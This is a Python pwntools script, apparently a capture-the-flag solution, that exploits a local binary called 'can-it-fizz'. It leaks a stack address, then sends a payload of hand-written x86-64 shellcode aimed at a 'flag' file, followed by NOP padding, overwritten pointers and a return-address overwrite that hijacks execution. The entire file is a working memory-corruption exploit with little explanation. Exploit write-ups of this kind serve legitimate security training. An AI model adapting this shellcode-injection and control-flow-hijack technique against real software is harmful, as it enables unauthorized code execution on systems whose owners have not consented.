from pwn import *

p = process("./can-it-fizz")

offset_from_leak_to_buffer = -15
offset_to_src = 28
offset_to_rip = 52

print(p.clean())

for i in range(0, 5):
    print("[+]", i,"Burning till 5")
    p.send(b"burn")
    print(p.clean())

print(p.clean())

print("[+] 5th iteration, now src* = stack")

p.send(b"A" * 24 + b"\xff" * 4) # \xff\xff\xff\xff will make sure v4 is -1, thus satisfying conditions to leak and to loop

x = p.clean()
print(x)
leaked_stack = int.from_bytes(x.split(b'\xff\xff\xff\xff')[1][:6], 'little')

print("[+] Leaked 'stack' string address :: ", hex(leaked_stack))
print("[+] Target rip :: ", hex(leaked_stack + offset_from_leak_to_buffer))

print(p.clean())

shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x2f\x2f\x66\x6c\x61\x67\x53\x48\x89\xe7\x6a\x04\x5e\x6a\x5a\x58\x0e\x05" # 0x0e is 0x0f in reality
# but we kept it that because that place we have our counter v4

payload = b""
payload += shellcode
payload += b"\x00\x00"
payload += b"\x90" * (offset_to_src - len(payload))
payload += p64(leaked_stack)
payload += p64(leaked_stack + 0x100)
payload += b"\x90" * (offset_to_rip - len(payload))
payload += p64(leaked_stack + offset_from_leak_to_buffer)

p.send(payload)

print(p.clean())

p.interactive()

p.close()
